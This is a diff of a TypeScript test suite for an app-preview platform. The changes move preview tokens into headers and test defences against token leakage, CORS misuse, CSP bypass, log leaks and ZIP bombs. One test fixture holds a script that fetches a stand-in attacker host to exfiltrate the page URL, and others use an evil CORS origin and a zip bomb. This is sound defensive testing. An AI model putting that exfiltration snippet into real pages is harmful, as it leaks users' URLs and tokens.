@@ -49,11 +49,19 @@ test.after(async () => {
 
 async function apiJson(
   urlPath: string,
-  options: { method?: string; token?: string; cookie?: string; origin?: string; body?: unknown } = {}
+  options: {
+    method?: string;
+    token?: string;
+    previewToken?: string;
+    cookie?: string;
+    origin?: string;
+    body?: unknown;
+  } = {}
 ) {
   const headers: Record<string, string> = {};
   if (options.body !== undefined) headers['Content-Type'] = 'application/json';
   if (options.token) headers['Authorization'] = `Bearer ${options.token}`;
+  if (options.previewToken) headers['X-Carmen-Preview-Token'] = options.previewToken;
   if (options.cookie) headers['Cookie'] = options.cookie;
   if (options.origin) headers['Origin'] = options.origin;
 
@@ -241,20 +249,62 @@ test('Authorization & IDOR protection: User B is blocked from User A projects, b
   assert.equal(ptRes.status, 200);
   const previewToken = String(ptRes.json.token);
 
-  const previewHtml = await apiJson(`/preview/${projectAId}/t/${previewToken}/`);
+  const previewHtml = await apiJson(`/preview/${projectAId}/`, { previewToken });
   assert.equal(previewHtml.status, 200);
-  assert.match(previewHtml.headers.get('content-security-policy') || '', new RegExp(`connect-src .*/preview/${projectAId}/`));
+  const cspHeader = previewHtml.headers.get('content-security-policy') || '';
+  assert.match(cspHeader, new RegExp(`connect-src [^;]*?/preview/${projectAId}/(?:;|$)`));
+  assert.equal(/connect-src[^;]*\bhttps:(?:\s|;|$)/.test(cspHeader), false, 'Preview CSP connect-src must block arbitrary https: outbound exfiltration');
   assert.equal(previewHtml.headers.get('access-control-allow-credentials'), null);
+  assert.equal(previewHtml.text.includes(previewToken), false, 'Preview HTML must NEVER contain previewToken');
 
-  // CRUD through scoped preview token works cleanly
-  const insertTodo = await apiJson(`/preview/${projectAId}/t/${previewToken}/api/todos`, {
+  // CRUD through header-scoped preview token works cleanly
+  const insertTodo = await apiJson(`/preview/${projectAId}/api/todos`, {
     method: 'POST',
+    previewToken,
     body: { title: 'Verify isolated preview CRUD', priority: 'high' },
   });
   assert.equal(insertTodo.status, 201);
-  const listTodos = await apiJson(`/preview/${projectAId}/t/${previewToken}/api/todos`);
+  const listTodos = await apiJson(`/preview/${projectAId}/api/todos`, { previewToken });
   assert.equal(listTodos.status, 200);
   assert.ok(Array.isArray(listTodos.json.rows) && listTodos.json.rows.length > 0);
+
+  // Reject preview tokens placed in URL path (/t/:token/) or query string (?pt=)
+  const urlPathTokenRes = await apiJson(`/preview/${projectAId}/t/${previewToken}/`);
+  assert.equal(urlPathTokenRes.status, 403);
+  assert.equal(urlPathTokenRes.json.code, 'URL_TOKEN_FORBIDDEN');
+  assert.equal(urlPathTokenRes.text.includes(previewToken), false);
+
+  const queryTokenRes = await apiJson(`/preview/${projectAId}/?pt=${encodeURIComponent(previewToken)}`);
+  assert.equal(queryTokenRes.status, 403);
+  assert.equal(queryTokenRes.text.includes(previewToken), false);
+
+  // HttpOnly path-scoped session cookie flow works without token in URL
+  const previewSess = await apiJson(`/preview/${projectAId}/session`, {
+    method: 'POST',
+    previewToken,
+    origin: baseUrl,
+  });
+  assert.equal(previewSess.status, 200);
+  const previewSetCookie = previewSess.headers.get('set-cookie') || '';
+  assert.match(previewSetCookie, /HttpOnly/i);
+  assert.match(previewSetCookie, new RegExp(`Path=/preview/${projectAId}/`, 'i'));
+  const previewCookiePair = previewSetCookie.split(';')[0];
+  const cookiePreviewHtml = await apiJson(`/preview/${projectAId}/`, { cookie: previewCookiePair });
+  assert.equal(cookiePreviewHtml.status, 200);
+  assert.equal(cookiePreviewHtml.text.includes(previewToken), false);
+
+  // Untrusted CORS origin is NOT granted Access-Control-Allow-Origin
+  const evilCorsRes = await apiJson(`/preview/${projectAId}/api/todos`, {
+    previewToken,
+    origin: 'https://evil-attacker.example',
+  });
+  assert.equal(evilCorsRes.headers.get('access-control-allow-origin'), null);
+
+  // Expired preview token is rejected with 403 INVALID_TOKEN
+  const { createPreviewToken } = await import('./security');
+  const expiredToken = createPreviewToken(projectAId, String((await apiJson('/api/auth/me', { token: tokenA })).json.user && ((await apiJson('/api/auth/me', { token: tokenA })).json.user as { id: string }).id), -30);
+  const expiredRes = await apiJson(`/preview/${projectAId}/`, { previewToken: expiredToken });
+  assert.equal(expiredRes.status, 403);
 
   // User B's project rejects User A's preview token (strict project scope)
   const projBRes = await apiJson('/api/projects', {
@@ -263,7 +313,7 @@ test('Authorization & IDOR protection: User B is blocked from User A projects, b
     body: { name: 'Bob Project' },
   });
   const projectBId = String((projBRes.json.project as { id: string }).id);
-  const crossProjectPreview = await apiJson(`/preview/${projectBId}/t/${previewToken}/`);
+  const crossProjectPreview = await apiJson(`/preview/${projectBId}/`, { previewToken });
   assert.equal(crossProjectPreview.status, 403);
 });
 
@@ -686,7 +736,9 @@ INSERT OR IGNORE INTO custom_pk_items (sku, qty) VALUES ('SKU-001', 5);`,
 
   const previewTokRes = await apiJson(`/api/projects/${projectId}/preview-token`, { token: tokenA });
   const pToken = String(previewTokRes.json.token);
-  const rowsRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/api/custom_pk_items`);
+  const rowsRes = await fetch(`${baseUrl}/preview/${projectId}/api/custom_pk_items`, {
+    headers: { 'X-Carmen-Preview-Token': pToken },
+  });
   assert.equal(rowsRes.status, 200);
   const rowsJson = (await rowsRes.json()) as { rows: Array<{ sku: string; qty: number }> };
   assert.equal(rowsJson.rows.length, 1);
@@ -789,15 +841,19 @@ test('Preview pipeline handles HTML, React/Vite+Tailwind, assets/fonts, CSP, err
     body: { path: 'public/logo.svg', content: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="4"/></svg>' },
   });
 
-  const htmlRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/`, {
-    headers: { 'X-Forwarded-Proto': 'http' },
+  const htmlRes = await fetch(`${baseUrl}/preview/${projectId}/`, {
+    headers: {
+      'X-Forwarded-Proto': 'http',
+      'X-Carmen-Preview-Token': pToken,
+    },
   });
   assert.equal(htmlRes.status, 200);
   assert.equal(htmlRes.headers.get('cache-control'), 'no-store');
   const htmlText = await htmlRes.text();
-  assert.match(htmlText, new RegExp(`<base href="/preview/${projectId}/t/${pToken}/"`));
-  assert.match(htmlText, new RegExp(`data-carmen-asset="/preview/${projectId}/t/${pToken}/styles\\.css"`));
-  assert.match(htmlText, new RegExp(`data-carmen-asset="/preview/${projectId}/t/${pToken}/app\\.js"`));
+  assert.match(htmlText, new RegExp(`<base href="[^"]*/preview/${projectId}/"`));
+  assert.match(htmlText, new RegExp(`data-carmen-asset="/preview/${projectId}/styles\\.css"`));
+  assert.match(htmlText, new RegExp(`data-carmen-asset="/preview/${projectId}/app\\.js"`));
+  assert.equal(htmlText.includes(pToken), false, 'Preview HTML must never leak token');
   assert.match(htmlText, /window\.__LOADED_APP__ = true/);
   assert.match(htmlText, /data:image\/svg\+xml;base64,/);
   assert.match(htmlText, /https:\/\/fonts\.googleapis\.com/);
@@ -808,6 +864,7 @@ test('Preview pipeline handles HTML, React/Vite+Tailwind, assets/fonts, CSP, err
   const csp = htmlRes.headers.get('content-security-policy') || '';
   assert.match(csp, new RegExp(`script-src http://[^;]+/preview/${projectId}/[^;]*https:`));
   assert.match(csp, new RegExp(`style-src http://[^;]+/preview/${projectId}/[^;]*https:`));
+  assert.match(csp, new RegExp(`connect-src http://[^;]+/preview/${projectId}/(?:;|$)`));
   assert.match(csp, /font-src [^;]*https:/);
   assert.match(csp, /img-src [^;]*https:/);
   assert.match(csp, /object-src 'none'/);
@@ -817,10 +874,11 @@ test('Preview pipeline handles HTML, React/Vite+Tailwind, assets/fonts, CSP, err
   const prevAppUrl = process.env.APP_URL;
   process.env.APP_URL = 'https://carmen-cloudrun.example.run.app';
   try {
-    const proxiedRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/`, {
+    const proxiedRes = await fetch(`${baseUrl}/preview/${projectId}/`, {
       headers: {
         'X-Forwarded-Host': 'carmen-cloudrun.example.run.app',
         'X-Forwarded-Proto': 'http',
+        'X-Carmen-Preview-Token': pToken,
       },
     });
     assert.equal(proxiedRes.status, 200);
@@ -834,20 +892,21 @@ test('Preview pipeline handles HTML, React/Vite+Tailwind, assets/fonts, CSP, err
     else process.env.APP_URL = prevAppUrl;
   }
 
-  const cssRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/styles.css`);
+  const pHeaders = { 'X-Carmen-Preview-Token': pToken };
+  const cssRes = await fetch(`${baseUrl}/preview/${projectId}/styles.css`, { headers: pHeaders });
   assert.equal(cssRes.status, 200);
   assert.match(cssRes.headers.get('content-type') || '', /^text\/css/);
 
-  const jsRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/app.js`);
+  const jsRes = await fetch(`${baseUrl}/preview/${projectId}/app.js`, { headers: pHeaders });
   assert.equal(jsRes.status, 200);
   assert.match(jsRes.headers.get('content-type') || '', /^application\/javascript/);
 
   // Missing JS asset MUST return 404 text/plain (never fallback to index.html)
-  const missingJsRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/assets/does-not-exist.js`);
+  const missingJsRes = await fetch(`${baseUrl}/preview/${projectId}/assets/does-not-exist.js`, { headers: pHeaders });
   assert.equal(missingJsRes.status, 404);
   assert.match(missingJsRes.headers.get('content-type') || '', /^text\/plain/);
 
-  const svgRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/logo.svg`);
+  const svgRes = await fetch(`${baseUrl}/preview/${projectId}/logo.svg`, { headers: pHeaders });
   assert.equal(svgRes.status, 200);
   assert.equal(svgRes.headers.get('content-type'), 'image/svg+xml');
 
@@ -863,16 +922,16 @@ test('Preview pipeline handles HTML, React/Vite+Tailwind, assets/fonts, CSP, err
   fsSync.default.writeFileSync(pathMod.default.join(wsDir, 'public', 'fonts', 'inter.woff2'), fakeWoff2);
   fsSync.default.writeFileSync(pathMod.default.join(wsDir, '.env'), 'SECRET=do-not-expose');
 
-  const pngRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/banner.png`);
+  const pngRes = await fetch(`${baseUrl}/preview/${projectId}/banner.png`, { headers: pHeaders });
   assert.equal(pngRes.status, 200);
   assert.equal(pngRes.headers.get('content-type'), 'image/png');
   assert.deepEqual(Buffer.from(await pngRes.arrayBuffer()), fakePng);
 
-  const fontRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/fonts/inter.woff2`);
+  const fontRes = await fetch(`${baseUrl}/preview/${projectId}/fonts/inter.woff2`, { headers: pHeaders });
   assert.equal(fontRes.status, 200);
   assert.equal(fontRes.headers.get('content-type'), 'font/woff2');
 
-  const envBlocked = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/.env`);
+  const envBlocked = await fetch(`${baseUrl}/preview/${projectId}/.env`, { headers: pHeaders });
   assert.equal(envBlocked.status, 404);
 
   // 3) React + Vite + TSX + @/ alias + Tailwind v4 project bundling (both self-contained HTML and /src/main.tsx)
@@ -934,17 +993,17 @@ createRoot(document.getElementById('root')!).render(<App />);`,
   );
 
   // Served HTML inlines compiled React+Vite bundle so opaque-origin sandbox iframes behind auth proxies never fail script CORS/cookies
-  const reactHtmlRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/`);
+  const reactHtmlRes = await fetch(`${baseUrl}/preview/${projectId}/`, { headers: pHeaders });
   assert.equal(reactHtmlRes.status, 200);
   assert.match(reactHtmlRes.headers.get('content-type') || '', /^text\/html/);
   const reactHtmlText = await reactHtmlRes.text();
-  assert.match(reactHtmlText, new RegExp(`<script type="module" data-carmen-asset="/preview/${projectId}/t/${pToken}/src/main\\.tsx">`));
+  assert.match(reactHtmlText, new RegExp(`<script type="module" data-carmen-asset="/preview/${projectId}/src/main\\.tsx">`));
   assert.doesNotMatch(reactHtmlText, /<script[^>]+src=["'][^"']*src\/main\.tsx["']/i);
   assert.match(reactHtmlText, /carmen-bundled-style/);
   assert.match(reactHtmlText, /CounterLabel|Count/);
 
   // Direct module endpoint also returns compiled JavaScript (never raw TSX)
-  const reactEntryRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/src/main.tsx`);
+  const reactEntryRes = await fetch(`${baseUrl}/preview/${projectId}/src/main.tsx`, { headers: pHeaders });
   assert.equal(reactEntryRes.status, 200);
   assert.match(reactEntryRes.headers.get('content-type') || '', /^application\/javascript/);
   const reactBundleJs = await reactEntryRes.text();
@@ -961,13 +1020,13 @@ createRoot(document.getElementById('root')!).render(<App />);`,
     },
   });
 
-  const brokenHtmlRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/`);
+  const brokenHtmlRes = await fetch(`${baseUrl}/preview/${projectId}/`, { headers: pHeaders });
   assert.equal(brokenHtmlRes.status, 500);
   const brokenHtmlText = await brokenHtmlRes.text();
   assert.match(brokenHtmlText, /nonexistent-broken-pkg-999/);
   assert.match(brokenHtmlText, /carmen-preview-error/);
 
-  const brokenEntryRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/src/main.tsx`);
+  const brokenEntryRes = await fetch(`${baseUrl}/preview/${projectId}/src/main.tsx`, { headers: pHeaders });
   assert.equal(brokenEntryRes.status, 500);
   const brokenText = await brokenEntryRes.text();
   assert.match(brokenText, /nonexistent-broken-pkg-999/);
@@ -987,13 +1046,15 @@ createRoot(document.getElementById('root')!).render(<App />);`,
   });
   const recoveredHealth = await apiJson(`/api/projects/${projectId}/preview-health`, { token: tokenA });
   assert.equal((recoveredHealth.json.health as { status: string }).status, 'running');
-  const recoveredHtml = await (await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/`)).text();
+  const recoveredHtml = await (await fetch(`${baseUrl}/preview/${projectId}/`, { headers: pHeaders })).text();
   assert.match(recoveredHtml, /Recovered App v2/);
-  const recoveredBundle = await (await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/src/main.tsx`)).text();
+  const recoveredBundle = await (await fetch(`${baseUrl}/preview/${projectId}/src/main.tsx`, { headers: pHeaders })).text();
   assert.match(recoveredBundle, /Recovered App v2/);
 
   // 6) Invalid preview token -> HTTP 403 diagnostic HTML with INVALID_TOKEN
-  const badTokRes = await fetch(`${baseUrl}/preview/${projectId}/t/invalid.tampered.token/`);
+  const badTokRes = await fetch(`${baseUrl}/preview/${projectId}/`, {
+    headers: { 'X-Carmen-Preview-Token': 'invalid.tampered.token' },
+  });
   assert.equal(badTokRes.status, 403);
   const badTokHtml = await badTokRes.text();
   assert.match(badTokHtml, /INVALID_TOKEN/);
@@ -1024,17 +1085,17 @@ createRoot(document.getElementById('root')!).render(<App />);`,
     // Symlink creation may be restricted in some environments; handled safely either way
   }
 
-  const symlinkRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/leak.txt`);
+  const symlinkRes = await fetch(`${baseUrl}/preview/${projectId}/leak.txt`, { headers: pHeaders });
   assert.equal(symlinkRes.status, 404);
 
-  const distHtmlRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/`);
+  const distHtmlRes = await fetch(`${baseUrl}/preview/${projectId}/`, { headers: pHeaders });
   assert.equal(distHtmlRes.status, 200);
   const distHtmlText = await distHtmlRes.text();
   assert.match(distHtmlText, /Built Dist v1/);
-  assert.match(distHtmlText, new RegExp(`data-carmen-asset="/preview/${projectId}/t/${pToken}/assets/bundle\\.js"`));
+  assert.match(distHtmlText, new RegExp(`data-carmen-asset="/preview/${projectId}/assets/bundle\\.js"`));
   assert.match(distHtmlText, /dist-bundle-v1/);
 
-  const distAssetRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/assets/bundle.js`);
+  const distAssetRes = await fetch(`${baseUrl}/preview/${projectId}/assets/bundle.js`, { headers: pHeaders });
   assert.equal(distAssetRes.status, 200);
   assert.match(await distAssetRes.text(), /dist-bundle-v1/);
 
@@ -1045,7 +1106,7 @@ createRoot(document.getElementById('root')!).render(<App />);`,
     token: tokenA,
     body: { path: 'index.html', content: '<!doctype html><html><body><h1>Live Source v3</h1></body></html>' },
   });
-  const liveAfterDistRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/`);
+  const liveAfterDistRes = await fetch(`${baseUrl}/preview/${projectId}/`, { headers: pHeaders });
   assert.equal(liveAfterDistRes.status, 200);
   assert.match(await liveAfterDistRes.text(), /Live Source v3/);
 
@@ -1055,7 +1116,7 @@ createRoot(document.getElementById('root')!).render(<App />);`,
     method: 'DELETE',
     token: tokenA,
   });
-  const missingHtmlRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pToken}/`);
+  const missingHtmlRes = await fetch(`${baseUrl}/preview/${projectId}/`, { headers: pHeaders });
   assert.equal(missingHtmlRes.status, 404);
   const missingHtmlText = await missingHtmlRes.text();
   assert.match(missingHtmlText, /MISSING_INDEX/);
@@ -1173,7 +1234,9 @@ test('Multi-tenant upgrades: APK build status & concurrency limit, preview sleep
     // Requesting the sleeping preview wakes it transparently with X-Carmen-Preview-State: waking
     const tokRes = await apiJson(`/api/projects/${project2Id}/preview-token`, { token });
     const pTok = String(tokRes.json.token);
-    const wakeFetch = await fetch(`${baseUrl}/preview/${project2Id}/t/${pTok}/`);
+    const wakeFetch = await fetch(`${baseUrl}/preview/${project2Id}/`, {
+      headers: { 'X-Carmen-Preview-Token': pTok },
+    });
     assert.equal(wakeFetch.status, 200);
     assert.equal(wakeFetch.headers.get('x-carmen-preview-state'), 'waking');
     assert.equal(previewLifecycleManager.getSession(project2Id)?.state, 'active');
@@ -1287,24 +1350,25 @@ test('ZIP importer extracts 160+ files with wrapper stripping, binary woff2 font
   const tokRes = await apiJson(`/api/projects/${projectId}/preview-token`, { token });
   const pTok = String(tokRes.json.token);
 
-  const fontRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pTok}/fonts/dm-sans-latin.woff2`);
+  const pHeaders = { 'X-Carmen-Preview-Token': pTok };
+  const fontRes = await fetch(`${baseUrl}/preview/${projectId}/fonts/dm-sans-latin.woff2`, { headers: pHeaders });
   assert.equal(fontRes.status, 200);
   assert.equal(fontRes.headers.get('content-type'), 'font/woff2');
   const servedFontBytes = Buffer.from(await fontRes.arrayBuffer());
   assert.deepEqual(servedFontBytes, woff2Bytes);
 
-  const manifestRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pTok}/manifest.webmanifest`);
+  const manifestRes = await fetch(`${baseUrl}/preview/${projectId}/manifest.webmanifest`, { headers: pHeaders });
   assert.equal(manifestRes.status, 200);
   assert.equal(manifestRes.headers.get('content-type'), 'application/manifest+json');
 
   // CSS url(...) rewriting and JS/TSX module bundling must succeed with zero missing local /preview/... errors
-  const cssRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pTok}/src/index.css`);
+  const cssRes = await fetch(`${baseUrl}/preview/${projectId}/src/index.css`, { headers: pHeaders });
   assert.equal(cssRes.status, 200);
   const cssText = await cssRes.text();
   assert.match(cssText, /data:font\/woff2;base64,/);
-  assert.match(cssText, new RegExp(`/preview/${projectId}/t/${pTok}/images/hero\\.png`));
+  assert.match(cssText, new RegExp(`/preview/${projectId}/images/hero\\.png`));
 
-  const entryRes = await fetch(`${baseUrl}/preview/${projectId}/t/${pTok}/src/main.tsx`);
+  const entryRes = await fetch(`${baseUrl}/preview/${projectId}/src/main.tsx`, { headers: pHeaders });
   assert.equal(entryRes.status, 200);
   const entryCode = await entryRes.text();
   assert.match(entryCode, /Studio App/);
@@ -1861,10 +1925,20 @@ test('Preview error HTML and runtime bridge escape script close tags and do not 
     '<!doctype html><html><head></head><body><h1>OK</h1></body></html>',
     `prj_${payload}`,
     'secret_preview_token_must_not_leak',
-    '/preview/prj/t/tok/'
+    '/preview/prj/',
+    {
+      bridgeNonce: 'abcdef0123456789',
+      parentOrigin: 'https://app.carmen.example',
+      cspMeta: "default-src https://app.carmen.example/preview/prj/; connect-src https://app.carmen.example/preview/prj/; object-src 'none'",
+      baseTagHref: 'https://app.carmen.example/preview/prj/',
+    }
   );
   assert.equal(bridged.includes('secret_preview_token_must_not_leak'), false);
   assert.equal(bridged.includes('ev.source!==window.parent'), true);
+  assert.equal(bridged.includes('ev.origin!==PARENT_ORIGIN'), true);
+  assert.equal(bridged.includes('d.bridgeNonce!==NONCE'), true);
+  assert.equal(bridged.includes('https://app.carmen.example'), true);
+  assert.equal(bridged.includes("postMessage(payload,'*')"), false, 'Must use explicit parentOrigin instead of wildcard *');
 });
 
 test('Full-stack project (client/index.html + server/index.ts + schema.sql) resolves preview & architecture and /api/health reports PG compatibility', async () => {
@@ -1939,7 +2013,9 @@ test('Full-stack project (client/index.html + server/index.ts + schema.sql) reso
   assert.equal(tokRes.status, 200);
   const previewTok = String(tokRes.json.token);
 
-  const previewHtml = await fetch(`${baseUrl}/preview/${projectId}/t/${previewTok}/index.html`);
+  const previewHtml = await fetch(`${baseUrl}/preview/${projectId}/index.html`, {
+    headers: { 'X-Carmen-Preview-Token': previewTok },
+  });
   assert.equal(previewHtml.status, 200);
   const body = await previewHtml.text();
   assert.match(body, /Hello Fullstack/);
@@ -2151,7 +2227,8 @@ srv.listen(Number(process.env.PORT), '127.0.0.1');
   assert.equal(tokResA.status, 200);
   const pTokA = String(tokResA.json.token);
 
-  const proxyHealth = await fetch(`${baseUrl}/preview/${idA}/t/${pTokA}/api/health`);
+  const pHeadersA = { 'X-Carmen-Preview-Token': pTokA };
+  const proxyHealth = await fetch(`${baseUrl}/preview/${idA}/api/health`, { headers: pHeadersA });
   assert.equal(proxyHealth.status, 200);
   const proxyHealthJson = (await proxyHealth.json()) as Record<string, unknown>;
   assert.equal(proxyHealthJson.ok, true);
@@ -2162,16 +2239,16 @@ srv.listen(Number(process.env.PORT), '127.0.0.1');
   assert.equal(proxyHealthJson.hasGeminiKey, false, 'Backend child must NOT inherit GEMINI_API_KEY');
   assert.equal(proxyHealthJson.dataDirVisible, false, 'Host DATA_DIR must be masked inside OS sandbox');
 
-  const postItem = await fetch(`${baseUrl}/preview/${idA}/t/${pTokA}/api/items`, {
+  const postItem = await fetch(`${baseUrl}/preview/${idA}/api/items`, {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: { 'Content-Type': 'application/json', ...pHeadersA },
     body: JSON.stringify({ title: 'Verify real backend SQLite' }),
   });
   assert.equal(postItem.status, 201);
   const createdItem = (await postItem.json()) as { id: number; title: string };
   assert.equal(createdItem.title, 'Verify real backend SQLite');
 
-  const getItems = await fetch(`${baseUrl}/preview/${idA}/t/${pTokA}/api/items`);
+  const getItems = await fetch(`${baseUrl}/preview/${idA}/api/items`, { headers: pHeadersA });
   assert.equal(getItems.status, 200);
   const listBeforeRestart = (await getItems.json()) as { items: Array<{ id: number; title: string }> };
   assert.equal(listBeforeRestart.items.length, 1);
@@ -2201,7 +2278,7 @@ srv.listen(Number(process.env.PORT), '127.0.0.1');
   assert.ok(restartedBackend.restartCount >= 1);
   assert.equal(await waitForPidDead(pidA1), true, 'Old PID must be terminated after restart');
 
-  const getItemsAfter = await fetch(`${baseUrl}/preview/${idA}/t/${pTokA}/api/items`);
+  const getItemsAfter = await fetch(`${baseUrl}/preview/${idA}/api/items`, { headers: pHeadersA });
   assert.equal(getItemsAfter.status, 200);
   const listAfterRestart = (await getItemsAfter.json()) as { items: Array<{ title: string }> };
   assert.equal(listAfterRestart.items.length, 1);
@@ -2218,7 +2295,7 @@ srv.listen(Number(process.env.PORT), '127.0.0.1');
   });
   assert.equal(await waitForPidDead(restartedBackend.pid), true, 'File edit must stop stale backend process');
 
-  const afterEditHealth = await fetch(`${baseUrl}/preview/${idA}/t/${pTokA}/api/health`);
+  const afterEditHealth = await fetch(`${baseUrl}/preview/${idA}/api/health`, { headers: pHeadersA });
   assert.equal(afterEditHealth.status, 200);
   const afterEditJson = (await afterEditHealth.json()) as { version: string };
   assert.equal(afterEditJson.version, 'v2-updated');
@@ -2346,4 +2423,144 @@ test('FASE 4 (F-13, F-14): ephemeral local-only models endpoint and shared-key d
   }
 });
 
+test('4.1 Preview security: rejects URL/query tokens, blocks malicious outbound CSP connect-src, scrubs tokens from logs, and binds postMessage bridge', async () => {
+  resetRateLimitsForTest();
+  const reg = await apiJson('/api/auth/register', {
+    method: 'POST',
+    body: { email: 'previewsec@example.com', password: 'password123', name: 'Preview Sec' },
+  });
+  assert.equal(reg.status, 201);
+  const authToken = String(reg.json.sessionToken);
+
+  const projRes = await apiJson('/api/projects', {
+    method: 'POST',
+    token: authToken,
+    body: { name: 'Preview Security Lab' },
+  });
+  const projectId = String((projRes.json.project as { id: string }).id);
+
+  // Malicious project attempts to exfiltrate window.location.href and external HTTPS endpoints
+  await apiJson(`/api/projects/${projectId}/files`, {
+    method: 'PUT',
+    token: authToken,
+    body: {
+      path: 'index.html',
+      content: `<!doctype html><html><head></head><body><script>window.__EXFIL__ = location.href; fetch('https://attacker.invalid/steal?u=' + encodeURIComponent(location.href));</script></body></html>`,
+    },
+  });
+
+  const tokRes = await apiJson(`/api/projects/${projectId}/preview-token`, { token: authToken });
+  assert.equal(tokRes.status, 200);
+  const previewTok = String(tokRes.json.token);
+
+  const bridgeNonce = '0123456789abcdef0123456789abcdef';
+  const htmlRes = await fetch(`${baseUrl}/preview/${projectId}/`, {
+    headers: {
+      'X-Carmen-Preview-Token': previewTok,
+      'X-Carmen-Preview-Bridge-Nonce': bridgeNonce,
+      'X-Carmen-Preview-Parent-Origin': baseUrl,
+    },
+  });
+  assert.equal(htmlRes.status, 200);
+  const htmlBody = await htmlRes.text();
+  // Rendered preview HTML & meta CSP contain NO previewToken and restrict connect-src
+  assert.equal(htmlBody.includes(previewTok), false);
+  assert.match(htmlBody, /<meta http-equiv="Content-Security-Policy"/i);
+  assert.match(htmlBody, new RegExp(`connect-src ${baseUrl}/preview/${projectId}/`));
+  assert.equal(htmlBody.includes(bridgeNonce), true);
+  assert.equal(htmlBody.includes(baseUrl), true);
+
+  // Reject URL /t/:token/* on all methods including POST API routes
+  const postUrlTok = await fetch(`${baseUrl}/preview/${projectId}/t/${previewTok}/api/items`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ title: 'nope' }),
+  });
+  assert.equal(postUrlTok.status, 403);
+  const getQueryTok = await fetch(`${baseUrl}/preview/${projectId}/api/items?pt=${encodeURIComponent(previewTok)}`);
+  assert.equal(getQueryTok.status, 403);
+
+  // scrubSecrets removes preview tokens in paths, queries, cookies, headers, and raw payloads
+  const { scrubSecrets } = await import('./security');
+  const dirtyLog = `GET /preview/${projectId}/t/${previewTok}/?pt=${previewTok} Cookie: carmen_preview_${projectId}=${previewTok} X-Carmen-Preview-Token: ${previewTok}`;
+  const cleanLog = scrubSecrets(dirtyLog);
+  assert.equal(cleanLog.includes(previewTok), false, 'scrubSecrets must strip preview tokens from all log vectors');
+});
+
+test('Phase 5: Per-category rate limiter emits X-RateLimit-* + Retry-After headers and project ZIP import blocks compression bombs & deep paths', async () => {
+  resetRateLimitsForTest();
+  const reg = await apiJson('/api/auth/register', {
+    method: 'POST',
+    body: { email: 'phase5sec@example.com', password: 'password123', name: 'Phase5 Sec' },
+  });
+  assert.equal(reg.status, 201);
+  const token = String(reg.json.sessionToken);
+
+  // 1) Category rate limiter for ZIP imports (CARMEN_IMPORT_RATE_LIMIT_PER_5M=5) emits headers & 429 RATE_LIMITED
+  const prevImportLimit = process.env.CARMEN_IMPORT_RATE_LIMIT_PER_5M;
+  process.env.CARMEN_IMPORT_RATE_LIMIT_PER_5M = '5';
+  try {
+    // Reject non-ZIP signature immediately and track rate limit headers
+    let hit429 = false;
+    let retryAfterHeader = '';
+    for (let i = 0; i < 6; i += 1) {
+      const resp = await fetch(`${baseUrl}/api/projects/import-zip`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          Authorization: `Bearer ${token}`,
+        },
+        body: JSON.stringify({
+          name: `NotZip-${i}`,
+          zipBase64: Buffer.from('NOT_A_ZIP_HEADER').toString('base64'),
+        }),
+      });
+      if (i === 0) {
+        assert.equal(resp.status, 400);
+        assert.equal(resp.headers.get('x-ratelimit-limit'), '5');
+      }
+      if (resp.status === 429) {
+        hit429 = true;
+        retryAfterHeader = resp.headers.get('retry-after') || '';
+        const body = (await resp.json()) as { code?: string };
+        assert.equal(body.code, 'RATE_LIMITED');
+        break;
+      }
+    }
+    assert.equal(hit429, true, 'Expected 6th import attempt within 5m to trigger 429 RATE_LIMITED');
+    assert.ok(Number(retryAfterHeader) >= 1, 'Expected Retry-After header on 429 response');
+  } finally {
+    if (prevImportLimit === undefined) delete process.env.CARMEN_IMPORT_RATE_LIMIT_PER_5M;
+    else process.env.CARMEN_IMPORT_RATE_LIMIT_PER_5M = prevImportLimit;
+    resetRateLimitsForTest();
+  }
+
+  // 2) Project ZIP import rejects excessive directory depth (>16) and compression bombs (>100:1 over 128KB)
+  const JSZipMod = (await import('jszip')).default;
+  const deepZip = new JSZipMod();
+  deepZip.file('a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/deep.txt', 'too deep');
+  const deepBuf = await deepZip.generateAsync({ type: 'nodebuffer' });
+  const deepRes = await apiJson('/api/projects/import-zip', {
+    method: 'POST',
+    token,
+    body: { name: 'TooDeep', zipBase64: deepBuf.toString('base64') },
+  });
+  assert.equal(deepRes.status, 400);
+  assert.match(String(deepRes.json.error || ''), /Kedalaman direktori/i);
+
+  const bombZip = new JSZipMod();
+  bombZip.file('zeros.txt', Buffer.alloc(600 * 1024, 'A'));
+  const bombBuf = await bombZip.generateAsync({
+    type: 'nodebuffer',
+    compression: 'DEFLATE',
+    compressionOptions: { level: 9 },
+  });
+  const bombRes = await apiJson('/api/projects/import-zip', {
+    method: 'POST',
+    token,
+    body: { name: 'ZipBombProj', zipBase64: bombBuf.toString('base64') },
+  });
+  assert.equal(bombRes.status, 400);
+  assert.match(String(bombRes.json.error || ''), /Rasio kompresi/i);
